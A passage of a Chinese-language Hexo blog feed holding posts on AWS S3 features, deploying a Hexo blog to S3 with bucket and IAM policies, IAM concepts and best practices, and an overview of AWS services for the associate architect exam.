+<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><h4 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h4><p>开启版本控制后，对于bucket里每一个object的操作都会在版本中被记录，租户可以在console中下载历史版本，回滚，删除版本。值得一提的是，在跨Region备份功能开启时，主Bucket的版本删除并不会影响到备份bucket的版本。</p>
+<h4 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h4><p>该功能可以指定一个bucket和一个路径用于存放租户对于S3使用的所有日志，包括该bucket内的存取更新对象的操作。</p>
+<h4 id="Staic-website-hosting"><a href="#Staic-website-hosting" class="headerlink" title="Staic website hosting"></a>Staic website hosting</h4><p>开启此功能可以将一个bucket变成一个静态网站，只需要制定入口index.html和错误页面即可。当然还有一个前提是设置对象权限为所有人外部可访问。</p>
+<h4 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h4><p>给Bucket资源打上一个或多个标签，方便管理</p>
+<h4 id="Cross-region-replication"><a href="#Cross-region-replication" class="headerlink" title="Cross-region replication"></a>Cross-region replication</h4><p>制定一个另一个Region的Bucket作为备份，需要Version功能开启</p>
+<h4 id="Transfer-Acceleration"><a href="#Transfer-Acceleration" class="headerlink" title="Transfer Acceleration"></a>Transfer Acceleration</h4><p>加速上传功能，类似于CloudFront，通过缓存在Globle Infrastructure的节点加速上传</p>
+<h4 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h4><p>开启这个功能，当S3的bucket或object发生动作时，可以触发SNS topic或SQS队列，或者Lambda Function</p>
+<h3 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h3><h4 id="Access-Control-List"><a href="#Access-Control-List" class="headerlink" title="Access Control List"></a>Access Control List</h4><p>大概就是IAM的某一个用户，可以对对象/权限控制执行如何操作（读/写），值得注意的是，默认情况下一个bucket创建出来后它的全显是只有它的创建者可以读/写这个bucket，粒度较大，适用于整个bucket的权控制</p>
+<h4 id="Bucket-Policy"><a href="#Bucket-Policy" class="headerlink" title="Bucket Policy"></a>Bucket Policy</h4><p>更细粒度的权限控制方案，以资源标识符为单位，与IAM相对应，可用于指定某个用户可以对bucket内部的哪些资源做何种操作</p>
+<h4 id="Cross-Origin-Resource-Sharing-CORS"><a href="#Cross-Origin-Resource-Sharing-CORS" class="headerlink" title="Cross-Origin Resource Sharing (CORS)"></a>Cross-Origin Resource Sharing (CORS)</h4><p>允许外链请求，在网站中使用API调用S3的资源的时候必须将调用url添加到该项信任中</p>
+<h3 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h3><h4 id="Lifecycle"><a href="#Lifecycle" class="headerlink" title="Lifecycle"></a>Lifecycle</h4><p>生存周期主要针对一个文件被上传到S3中，一段时间后访问会减少，再过一段时间可能根本不会被访问而只需要备份的应用场景，可以设置Standard S3 -&gt; IA S3 -&gt; Glacier 的转移顺序，主要价值是减小开支<br>关于Lifecycle还有一个重要的表格：</p>
+<p><img src="/images/Table_S3_Glacier.png" alt=""></p>
+<h4 id="Analytics"><a href="#Analytics" class="headerlink" title="Analytics"></a>Analytics</h4><p>可以按标签过滤bucket中的object，生成csv报告，并手动将过滤出来的object转存到另一个同Region的bucket内</p>
+<h4 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics"></a>Metrics</h4><p>分为Storage metrics，Request metrics，Data transfer metrics，跟Cloudwatch结合，从多个维度度量租户的S3使用情况</p>
+<h4 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h4><p>S3的一个对象分拣服务，通过Inventory的方式定期将对象分类</p>
+<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ul>
+<li>一个对象最大不能超过5TB</li>
+<li>一个账号最多可创建100个bucket</li>
+<li>S3普通上传模式最大只支持5GB以下的文件大小，开启<a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/UploadingObjects.html" target="_blank" rel="external">multipart uploading</a>enable多进程上传和断点续传，从而提高上传效率，在带宽充足且有大文件需要上传的时候可以开启这个功能</li>
+</ul>
+<blockquote>
+<ul>
+<li>参考资料</li>
+<li>AWS S3 FAQ<a href="https://aws.amazon.com/s3/faqs/" target="_blank" rel="external">https://aws.amazon.com/s3/faqs/</a></li>
+<li>AWS S3 Detail<a href="https://aws.amazon.com/s3/details/" target="_blank" rel="external">https://aws.amazon.com/s3/details/</a></li>
+<li>AWS S3 Use Case<a href="https://docs.aws.amazon.com/AmazonS3/latest/gsg/S3-gsg-CommonUseScenarios.html" target="_blank" rel="external">https://docs.aws.amazon.com/AmazonS3/latest/gsg/S3-gsg-CommonUseScenarios.html</a></li>
+<li><a href="https://www.amazonaws.cn/en/s3/" target="_blank" rel="external">https://www.amazonaws.cn/en/s3/</a></li>
+<li>Uploading Object<a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/UploadingObjects.html" target="_blank" rel="external">https://docs.aws.amazon.com/AmazonS3/latest/dev/UploadingObjects.html</a></li>
+</ul>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。&lt;br&gt;简单来说S3提供了一些buc
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+    
+      <category term="S3" scheme="https://www.duyidong.com/tags/S3/"/>
+    
+      <category term="对象存储服务" scheme="https://www.duyidong.com/tags/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>将Hexo博客发布到S3</title>
+    <link href="https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/"/>
+    <id>https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/</id>
+    <published>2017-03-07T09:42:34.000Z</published>
+    <updated>2017-04-12T13:28:01.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近在学习AWS服务，加之两次遇到github.io无法访问的情况，决定将博客迁移到AWS S3上。</p>
+<h2 id="S3介绍"><a href="#S3介绍" class="headerlink" title="S3介绍"></a>S3介绍</h2><p>S3是AWS一个对象存储服务，拥有11个9的耐久度和3个9的可用性（并不算高），属于AWS底层存储服务。同时提供Host静态网站的功能</p>
+<h2 id="第一步：创建一个Bucket"><a href="#第一步：创建一个Bucket" class="headerlink" title="第一步：创建一个Bucket"></a>第一步：创建一个Bucket</h2><ul>
+<li>进入S3界面，点击<strong>CreateBucket</strong>，取名为www.duyidong.com</li>
+<li>选择一个Region，你可以在<a href="https://s3-accelerate-speedtest.s3-accelerate.amazonaws.com/en/accelerate-speed-comparsion.html" target="_blank" rel="external">这里</a>找到延迟最低的Region用于存放你的博客</li>
+<li><p>设置Policy，确保外部可访问：</p>
+<pre><code>{
+ &quot;Version&quot;: &quot;2012-10-17&quot;,
+ &quot;Statement&quot;: [
+     {
+         &quot;Sid&quot;: &quot;PublicReadForGetBucketObjects&quot;,
+         &quot;Effect&quot;: &quot;Allow&quot;,
+         &quot;Principal&quot;: &quot;*&quot;,
+         &quot;Action&quot;: &quot;s3:GetObject&quot;,
+         &quot;Resource&quot;: &quot;arn:aws:s3:::www.duyidong.com/*&quot;
+     }
+ ]
+}
+</code></pre><blockquote>
+<p>注： <code>arn:aws:s3:::www.duyidong.com/*</code>为bucket里对象的资源标识符</p>
+</blockquote>
+</li>
+<li><p>在<strong>Properties</strong>下开启<strong>Static website hosting</strong>，设置入口文件为<code>index.html</code>，404页面为<code>404/index.html</code></p>
+</li>
+</ul>
+<h2 id="第二步：创建一个用于上传静态文件的用户"><a href="#第二步：创建一个用于上传静态文件的用户" class="headerlink" title="第二步：创建一个用于上传静态文件的用户"></a>第二步：创建一个用于上传静态文件的用户</h2><h4 id="使用Policy-Generator创建一个Policy"><a href="#使用Policy-Generator创建一个Policy" class="headerlink" title="使用Policy Generator创建一个Policy"></a>使用Policy Generator创建一个Policy</h4><p>这里需要一个只有对www.duyidong.com这个bucket有上传权限的用户，首先要创建Policy，这里要用到Policy Generator。</p>
+<ul>
+<li>进入<strong>IAM -&gt; Policies -&gt; Create Policy -&gt; Policy Generator</strong></li>
+<li><p>选择S3的PutObject Action, ARN为目标Bucket的ARN，届时会生成如下Policy:</p>
+<blockquote>
+<p>注：经笔者反复试错，再参照<a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/example-policies-s3.html" target="_blank" rel="external">官方文档</a>，最终确定User Policy需要以下权限：</p>
+</blockquote>
+<pre><code>{
+&quot;Version&quot;:&quot;2012-10-17&quot;,
+&quot;Statement&quot;:[
+   {
+      &quot;Effect&quot;:&quot;Allow&quot;,
+      &quot;Action&quot;:[
+         &quot;s3:ListBucket&quot;,
+         &quot;s3:GetBucketLocation&quot;
+      ],
+      &quot;Resource&quot;:&quot;arn:aws:s3:::www.duyidong.com&quot;
+   },
+   {
+      &quot;Effect&quot;:&quot;Allow&quot;,
+      &quot;Action&quot;:[
+         &quot;s3:PutObject&quot;,
+         &quot;s3:GetObject&quot;,
+         &quot;s3:DeleteObject&quot;
+      ],
+      &quot;Resource&quot;:&quot;arn:aws:s3:::www.duyidong.com/*&quot;
+   }
+]
+}
+</code></pre></li>
+</ul>
+<h4 id="创建用户组"><a href="#创建用户组" class="headerlink" title="创建用户组"></a>创建用户组</h4><p><strong>Groups -&gt; Create New Group -&gt; </strong>将上一步创建的Policy attach到该UserGroup上，用户组创建完成。</p>
+<h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><p><strong>Users -&gt; Add User</strong>，勾选<code>Programmatic access</code>，输入用户名，将用户加入到上一步创建的用户组中，将用户的Access key下载到本地。</p>
+<h2 id="第三步：安装插件，上传静态文件"><a href="#第三步：安装插件，上传静态文件" class="headerlink" title="第三步：安装插件，上传静态文件"></a>第三步：安装插件，上传静态文件</h2><ul>
+<li>运行命令</li>
+</ul>
+<pre><code>npm install --save hexo-deployer-s3
+</code></pre><p>编辑<code>_config.yml</code>:</p>
+<pre><code>deploy:
+  type: s3
+  bucket: &lt;AWS bucket name&gt;
+  aws_key: &lt;AWS id key&gt;
+  aws_secret: &lt;AWS secret key&gt;
+  region: &lt;AWS bucket region&gt;
+</code></pre><p>由于我会把博客源码放到Github上，Access key不能写在配置文件里，而采用环境变量的方式，在~/.bashrc中加入：</p>
+<pre><code>export AWS_ACCESS_KEY-ID=&lt;access key&gt;
+export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
+</code></pre><p>再执行</p>
+<pre><code>source ~/.bashrc
+</code></pre><p>届时将可以成功将博客发布到S3上，执行：</p>
+<pre><code>hexo d
+</code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>对比了一下Github和S3的速度，最大的一个页面github.io大概需要6-9秒，而S3要11秒左右，虽然github的速度不太稳定，但毕竟要比S3快，所以暂不把DNS指向S3，待日后开启CloudFront服务后再做决定。<br>另外，hexo是支持多路径发布的，形如：</p>
+<pre><code>deploy:
+- type: git
+  repo:
+- type: heroku
+  repo:
+</code></pre><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>要使用自己的域名，开启HTTPS，使用AWS的CND，参照：<a href="https://www.duyidong.com/2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/">使用AWS解锁HTTPS和CDN</a></p>
+<blockquote>
+<ul>
+<li>参考资料:</li>
+<li><a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">https://hexo.io/docs/deployment.html</a></li>
+<li><a href="https://inject.coffee/hexo-travis-s3-part-2-deploying-to-aws/" target="_blank" rel="external">https://inject.coffee/hexo-travis-s3-part-2-deploying-to-aws/</a></li>
+<li><a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/website-hosting-custom-domain-walkthrough.html" target="_blank" rel="external">https://docs.aws.amazon.com/AmazonS3/latest/dev/website-hosting-custom-domain-walkthrough.html</a></li>
+<li><a href="https://aws.amazon.com/s3/storage-classes/" target="_blank" rel="external">https://aws.amazon.com/s3/storage-classes/</a></li>
+<li><a href="https://aws.amazon.com/s3/reduced-redundancy/" target="_blank" rel="external">https://aws.amazon.com/s3/reduced-redundancy/</a></li>
+</ul>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近在学习AWS服务，加之两次遇到github.io无法访问的情况，决定将博客迁移到AWS S3上。&lt;/p&gt;
+&lt;h2 id=&quot;S3介绍&quot;&gt;&lt;a href=&quot;#S3介绍&quot; class=&quot;headerlink&quot; title=&quot;S3介绍&quot;&gt;&lt;/a&gt;S3介绍&lt;/h2&gt;&lt;p&gt;S3是A
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+    
+      <category term="S3" scheme="https://www.duyidong.com/tags/S3/"/>
+    
+      <category term="Blog" scheme="https://www.duyidong.com/tags/Blog/"/>
+    
+      <category term="Hexo" scheme="https://www.duyidong.com/tags/Hexo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>浅谈AWS IAM</title>
+    <link href="https://www.duyidong.com/2017/03/06/%E6%B5%85%E8%B0%88AWS-IAM/"/>
+    <id>https://www.duyidong.com/2017/03/06/浅谈AWS-IAM/</id>
+    <published>2017-03-06T12:41:50.000Z</published>
+    <updated>2017-04-12T13:27:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="浅谈-AWS-IAM"><a href="#浅谈-AWS-IAM" class="headerlink" title="浅谈 AWS IAM"></a>浅谈 AWS IAM</h1><p>IAM，全称Identity &amp; Access Management，作用是AWS资源的权限管理。</p>
+<h2 id="IAM解决了什么问题"><a href="#IAM解决了什么问题" class="headerlink" title="IAM解决了什么问题"></a>IAM解决了什么问题</h2><p>解决了什么问题，等同于带来了什么价值，在AWS的<a href="https://aws.amazon.com/iam/details/" target="_blank" rel="external">官方文档</a>中，IAM主要是出于以下需求被设计出来的：</p>
+<ul>
+<li><strong>增强安全：</strong>AWS给每个用户单独的验证，保证每个用户能够被分配恰当的权限，从而保证AWS资源的安全。默认情况下，IAM的User在被创建的时候是没有任何权限的，所以IAM是默认安全的。</li>
+<li><strong>粒度控制：</strong>IAM让租户可以进行细粒度的权限控制，比如terminate instance的权限，比如对S3 bucket中对象的只读权限。</li>
+<li><strong>临时证书：</strong>IAM允许创造生命周期短于用户的权限（Role），Role被绑定在AWS资源（如EC2 instance）上，确保资源之间的相互调用有适当的权限。</li>
+<li><strong>灵活的安全证书管理：</strong>IAM提供了多种验证方式，包括key pair， 用户名密码，X.509 certificates， MFA，用于Console，CLI，sdk等API调用。</li>
+<li><strong>外部身份系统：</strong>IAM使AWS支持第三方登录或与企业现有权限管理系统集成，比如微软的Active Directory，或第三方验证，比如Google，Facebook。</li>
+<li><strong>与AWS服务无缝贴合：</strong>IAM与AWS的几乎所有服务集成，首先你需要IAM的权限再能访问和使用AWS的服务，其次AWS中的服务需要IAM的权限才能完成对AWS其他资源的调用。</li>
+</ul>
+<h2 id="几个概念"><a href="#几个概念" class="headerlink" title="几个概念"></a>几个概念</h2><p>AWS的官方文档和很多博客都在说的Get Start，最重要的就是AWS中的几个名词：</p>
+<ul>
+<li><strong>User：</strong>一个User对应一个AWS用户，这个用户指的是一个真实的用户，用户在创建初期是没有任何权限的，需要被加到用户组或绑定Policy才能有相应权限，User有两种验证方式，一种是key pair，常用于集成到程序中和AWS CLI 使用，另一种是Username+Password的方式，这种方式只能用于Console登录。</li>
+<li><strong>UserGroup：</strong>类比Linux系统的UserGroup，一个UserGroup可以包含多个User，这些User具有UserGroup指定的所有权限，UserGroup的权限由Policy制定，Group不能嵌套Group，一个用户如在多个UserGroup中，权限取Group权限的和。</li>
+<li><strong>Policy：</strong>由“资源类型”和“操作类型”两个重要参数构成的Json文件，用于定义一定粒度的权限，支持模糊匹配（*），分为官方定义和自己定义，用于定义用户可对何种资源执行何种操作，Policy可以与User，UserGroup，Role绑定。</li>
+<li><strong>Role：</strong>IAM定义用于代替User赋予资源权限的权限单位，比如给一个EC2 instance S3 administrator的权限，便可以在改Instance上执行aws s3的所有命令，且在本地不会出现Creadentical文件（比User安全）。与User相同，Role 的权限也由Polic组成，由用户定义。另外，Role还可以用于赋予外部账号权限。</li>
+</ul>
+<h2 id="官方推荐最佳实践"><a href="#官方推荐最佳实践" class="headerlink" title="官方推荐最佳实践"></a>官方推荐最佳实践</h2><p>参照官方文档：<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html" target="_blank" rel="external">https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html</a></p>
+<ul>
+<li>禁用AWS Root账户：因为Root用户权限实在太大，要尽可能避免Root账户认证被泄露的风险，建议不要给Root账户创建Access Key，另外开启MFA验证。</li>
+<li>为每个用户创建单独的User</li>
+<li>尽可能使用Policies 添加权限</li>
+<li>使用UserGroup对用户权限进行分组管理</li>
+<li>最小权限原则</li>
+<li>开启强密码限制</li>
+<li>开启MFA设备验证</li>
+<li>为EC2 instance上的应用程序创建Role</li>
+<li>使用Role而不是User的Credentials</li>
+<li>经常更新Credentials</li>
+<li>移除不再使用的Creadentials</li>
+<li>使用策略提高额外的安全性：比如限制该资源只能从哪个网段访问，只能在某个时间段访问，强制开启MFA验证后才可访问，等等</li>
+<li>监控账户活动情况：CloudFront, CloudTrail, CloudWatch, Config, S3 log都可以保证账户活动被监控</li>
+</ul>
+<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-limits.html" target="_blank" rel="external">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-limits.html</a><br>大部分限制大部分情况下都碰不到，列几个常见的：</p>
+<ul>
+<li>每个User最多可被加入到10个UserGroup</li>
+<li>每个User最多可以有2个Access key(包括root account)</li>
+<li>一个用户只能验证一个MFA设备</li>
+<li>User Policy的长度限制为2KB</li>
+<li>Role Policy的长度限制为10KB</li>
+<li>UserGroup Policy的长度限制为5KB</li>
+</ul>
+<h2 id="几个知识点"><a href="#几个知识点" class="headerlink" title="几个知识点"></a>几个知识点</h2><p>以下知识点是笔者在查阅 <a href="https://aws.amazon.com/iam/faqs/" target="_blank" rel="external">FAQs</a> 时记录的：</p>
+<ul>
+<li>一个EC2 instance不能有多个Role，但一个Role可以被多个EC2 instance共用</li>
+<li>Role可以被attach 到一个正在运行的实例</li>
+<li>可以将Role与Auto Scaing Group关联，这样每个在该安全组内被启动的实例都会被附上该Role所指的权限</li>
+<li>AWS有一个用于测试你的Polic的工具：<a href="https://policysim.aws.amazon.com/" target="_blank" rel="external">Policy Simulator</a></li>
+<li>IAM的每一个记录都会被CloudTrail记录log，保存在S3中</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;浅谈-AWS-IAM&quot;&gt;&lt;a href=&quot;#浅谈-AWS-IAM&quot; class=&quot;headerlink&quot; title=&quot;浅谈 AWS IAM&quot;&gt;&lt;/a&gt;浅谈 AWS IAM&lt;/h1&gt;&lt;p&gt;IAM，全称Identity &amp;amp; Access Management
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+    
+      <category term="亚马逊认证与权限" scheme="https://www.duyidong.com/tags/%E4%BA%9A%E9%A9%AC%E9%80%8A%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%9D%83%E9%99%90/"/>
+    
+      <category term="Security" scheme="https://www.duyidong.com/tags/Security/"/>
+    
+      <category term="IAM" scheme="https://www.duyidong.com/tags/IAM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AWS Services Overview</title>
+    <link href="https://www.duyidong.com/2017/02/28/AWS-Services-Overview/"/>
+    <id>https://www.duyidong.com/2017/02/28/AWS-Services-Overview/</id>
+    <published>2017-02-28T06:55:01.000Z</published>
+    <updated>2017-04-12T13:21:28.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Amazon-Web-Server-服务概览"><a href="#Amazon-Web-Server-服务概览" class="headerlink" title="Amazon Web Server 服务概览"></a>Amazon Web Server 服务概览</h1><p>最近在准备AWS助理级架构师认证考试，借此机会梳理一下AWS比较核心的几个服务，不会太深入细节，只做简单阐释。<br>首先关于AWS服务一览：</p>
+<p><img src="/images/AWS_Services_Overview.png" alt=""></p>
+<p>以下服务会出现在助理级架构师考试中：</p>
+<p><img src="/images/AWS_Services_Exam.png" alt=""></p>
+<p>下面就按照这个顺序过一下AWS的众多服务。</p>
+<h2 id="AWS-Global-Infrastructure"><a href="#AWS-Global-Infrastructure" class="headerlink" title="AWS Global Infrastructure"></a>AWS Global Infrastructure</h2><p>AWS拥有全球化的基础设施让你的服务可以在瞬间扩展到全球，你可以在<a href="https://aws.amazon.com/about-aws/global-infrastructure/" target="_blank" rel="external">这里</a>查看亚马逊当前拥有的全球基础设施信息。<br>截止到今天（2017.02.28）AWS Cloud在全球共有<strong>42</strong>个<code>Availablity Zone</code>和<strong>16</strong>个<code>geographic Regions</code>，中国区有2个Region分别在北京和宁夏（宁夏区暂未开放），每个Region各有两个AZ，受政策限制，AWS中国区与其他各地区服务分离，由<a href="https://www.sinnet.com.cn/home/product/indexyun/16" target="_blank" rel="external">光环新网</a>代理，需要单独<a href="https://www.amazonaws.cn/en/sign-up/" target="_blank" rel="external">申请账号</a>。</p>
+<p><img src="https://d0.awsstatic.com/global-infrastructure/Global_Infrastructure_12-15-2016.png" alt=""></p>
+<h3 id="Region-amp-Availablity-Zone"><a href="#Region-amp-Availablity-Zone" class="headerlink" title="Region &amp; Availablity Zone"></a>Region &amp; Availablity Zone</h3><p>Region是AWS按物理地理划分的节点，每个Region包含两个或以上AZ，AZ可以理解为同在一个Region的多个数据中心。之所以一个Region要有至少两个Region是因为AWS很多服务都推荐跨AZ备份而做到高可用。<br>另外AZ之间网络通信延迟远大于Region之前通信，原因也很好理解，Region的物理距离很远，而同Region的AZ是在同一个城市。</p>
+<h3 id="Edge-Location"><a href="#Edge-Location" class="headerlink" title="Edge Location"></a>Edge Location</h3><p>Edge Location是比亚马逊数据中心覆盖面还广的服务，我们访问AWS console就使用过Edge Location，同时Edge Location还作为AWS Cloudfront（CDN）服务的节点，你可以在<a href="https://www.google.com/maps/d/viewer?msa=0&amp;mid=z8tAG_iMI0RE.kBLn8p8h4GGw" target="_blank" rel="external">这里</a>看到AWS服务在全球分布的情况，在<a href="https://aws.amazon.com/about-aws/global-infrastructure/regional-product-services/#AWS Edge Network Locations" target="_blank" rel="external">这里</a>查看AWS的Edge Location分部情况。</p>
+<h2 id="Networking-amp-Content-Deivery"><a href="#Networking-amp-Content-Deivery" class="headerlink" title="Networking &amp; Content Deivery"></a>Networking &amp; Content Deivery</h2><p>这一部分的内容主要包含网络和CDN。</p>
+<h3 id="VPC"><a href="#VPC" class="headerlink" title="VPC"></a>VPC</h3><p>VPC(<a href="https://aws.amazon.com/vpc/" target="_blank" rel="external">Virtual Private Cloud</a>)，AWS服务中关于网络最重要的一个服务，作用是在AWS中虚拟一个定制化局域网，从而可以像管理一个虚拟数据中心一样管理AWS中的资源。一个Region最多可以有5个VPC，你可以自由定义VPC的局域网网段（当然要使用专用网段），每个VPC之间可以单点连通前提是专用网段不重复。<br>VPC就是一个虚拟的局域网，可以通过给VPC绑定InternetGateway的方式让VPC成为public VPC，即在外网可以访问VPC内的服务。就好比公司网络中加了一个从内网出去的路由。当然要让外网的设备找到VPC中的资源还需要给VPC中的资源绑定一个公网IP。</p>
+<h3 id="Route53"><a href="#Route53" class="headerlink" title="Route53"></a>Route53</h3><p><a href="https://aws.amazon.com/route53/" target="_blank" rel="external">Route53</a>是AWS的DNS服务。可以注册DNS，配置A地址和CNAME。</p>
+<h3 id="Cloud-Front"><a href="#Cloud-Front" class="headerlink" title="Cloud Front"></a>Cloud Front</h3><p><a href="https://aws.amazon.com/cloudfront/" target="_blank" rel="external">Cloud Front</a>是亚马逊的CDN（Content Delivery Network）服务，用于缓存下载或上传的数据。</p>
+<h3 id="Direct-Connect"><a href="#Direct-Connect" class="headerlink" title="Direct Connect"></a>Direct Connect</h3><p><a href="https://aws.amazon.com/directconnect/" target="_blank" rel="external">Direct Connect</a>是亚马逊的网络直连服务，就是用一跟又粗又长的网线，从你的数据中心翻山越岭地连接到AWS的数据中心从而建立一个稳定可靠高效的私有连接。</p>
+<h2 id="Compute"><a href="#Compute" class="headerlink" title="Compute"></a>Compute</h2><p><a href="https://aws.amazon.com/products/compute/" target="_blank" rel="external">AWS Compute</a>包含了亚马逊最重要的服务——计算服务</p>
+<h3 id="EC2"><a href="#EC2" class="headerlink" title="EC2"></a>EC2</h3><p>EC2(<a href="https://aws.amazon.com/ec2/" target="_blank" rel="external">Elastic Compute Cloud</a>)可以理解为AWS的虚拟机，包含存储（EBS），镜像（AMI），备份（snapshot），防火墙（Security Group）等紧密相关的服务，AWS的一部分服务也是基于EC2的，比如ECS和RDS。<br>使用EC2你可以按照你的需要创建Instance，不仅可以自由控制Instance的数量，还可以动态调整虚拟机的各种参数，比如内存，CPU。最重要的是，使用AWS EC2你可以——按需付费。</p>
+<h3 id="EC2-Contianer-Service"><a href="#EC2-Contianer-Service" class="headerlink" title="EC2 Contianer Service"></a>EC2 Contianer Service</h3><p>ECS(<a href="https://aws.amazon.com/ecs/" target="_blank" rel="external">EC2 Contianer Service</a>)帮助管理在EC2上运行Docker或容器集群，适用于构建微服务。</p>
+<blockquote>
+<p>注：该服务不会出现在SAA考试中</p>
+</blockquote>
+<h3 id="Elastic-Beanstalk"><a href="#Elastic-Beanstalk" class="headerlink" title="Elastic Beanstalk"></a>Elastic Beanstalk</h3><p><a href="https://aws.amazon.com/elasticbeanstalk/" target="_blank" rel="external">Elastic Beanstalk</a>是一个用于方便部署web服务的一个傻瓜式应用，你不需要知道关于AWS的一切，只需要上传代码，Beanstalk会帮你选择合适的环境，运行环境，负载均衡，监控等等，目前支持语言包括 Java, .NET, PHP, Node.js, Python, Ruby, Go。</p>
+<blockquote>
+<p>注：该服务不会出现在SAA考试中，只需要知道Beanstalk是什么就可以。</p>
+</blockquote>
+<h3 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h3><p><a href="https://aws.amazon.com/lambda/" target="_blank" rel="external">Lambda</a>是一个云计算革命性的服务，关键词<strong>Serverless</strong>，也是AWS这几年大力在推的服务，主要特点是除了功能性的function以外的所有服务（操作系统，物理硬件，运行环境）都由AWS管理，资源只在被调用时创建并在使用完后立即销毁，最大限度地做到了高可用高伸缩，同时非常便宜，按照访问次数收费。（每百万次0.05美刀）<br>主要使用场景是流处理，应用后端。</p>
+<blockquote>
+<p>注：因为是比较新的服务，所以暂时还没有在SAA考试或样题中出现，但毫无疑问这是AWS一个重要的服务。</p>
+</blockquote>
+<h3 id="Lightsail"><a href="#Lightsail" class="headerlink" title="Lightsail"></a>Lightsail</h3><p><a href="https://amazonlightsail.com/" target="_blank" rel="external">Lightsail</a>与Elastic Beanstalk类似，也是一个给不会使用AWS的用户提供自动化部署的一个服务。</p>
+<blockquote>
+<p>注：该服务不算是AWS的核心服务，仅作为了解，考试内容不会涉及。</p>
+</blockquote>
+<h2 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h2><p><a href="https://aws.amazon.com/products/storage/" target="_blank" rel="external">AWS Storage</a>包含了AWS存储有关的服务，这里暂不列举EBS。</p>
+<h3 id="S3"><a href="#S3" class="headerlink" title="S3"></a>S3</h3><p>S3(<a href="https://aws.amazon.com/s3/" target="_blank" rel="external">Simple Storage Service</a>) 差不多是和AWS一样老的一个服务，同时支撑着AWS中很多其他的服务。<br>S3是一个高可用的对象存储服务，可以理解为一个巨大的磁盘可以存放图片，视频一类的大小静态文件，其存储持久性可达到11个9，可用性可以达到4个9。S3的对象存储单个文件最大可达5TB，总大小不设上限。同时S3可以作为静态网站使用，可以开启版本管理。本博客也准备迁移到AWS S3上。<br>S3的使用场景可以用作静态网站部署，数据存储（例如数据胡泊），用于数据分析，数据备份等。当然也可以用来构建Serverless服务。</p>
+<h3 id="Clacier"><a href="#Clacier" class="headerlink" title="Clacier"></a>Clacier</h3><p><a href="https://aws.amazon.com/glacier/" target="_blank" rel="external">Claier</a>是用于存档数据长期保存的一个服务，如果你有长时间不使用但是需要保存的数据，例如医院的病例，电视台的历史影像资料，你可以使用这个服务，其主要特点是异常便宜（0.004美刀/GB），同时能做到11个9的持久度。另外归档数据在提取时大概需要4-5个小时，所以不适宜存储需要频繁读写的数据。</p>
+<h3 id="EFS"><a href="#EFS" class="headerlink" title="EFS"></a>EFS</h3><p>EFS(<a href="https://aws.amazon.com/efs/" target="_blank" rel="external">Elastic File System</a>)是一个可移动的块存储设备，你可以想象成一个可以任意扩容的移动硬盘，在需要时被接到任何一台EC2 instance上，同时它还具有nfs的功能，可以同时连接多台设备。EFS在刚创建的时候大小为零，随着存放资源增多逐渐扩容，真正做到按需付费，缺点是小贵，大概0.3美刀/GB</p>
